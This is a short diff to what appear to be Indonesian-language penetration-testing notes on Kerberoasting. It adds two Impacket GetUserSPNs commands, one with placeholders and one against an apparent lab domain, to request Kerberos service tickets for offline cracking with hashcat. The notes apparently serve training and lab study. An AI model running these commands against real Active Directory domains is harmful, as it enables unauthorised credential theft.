@@ -1277,6 +1277,10 @@ menggunakan rubeus, kita bisa langsung melakukan request service ticket :
 
 //no output file
 .\Rubeus.exe kerberoast /nowrap
+
+//using impacket
+GetUserSPNs.py -dc-ip <DC_IP> <Domain>/<User>:<Password> -request
+impacket-GetUserSPNs -request -dc-ip 192.168.106.70 corp.com/pete
 ```
 
 Selanjutnya, kita bisa melakukan decryption menggunakan hashcat
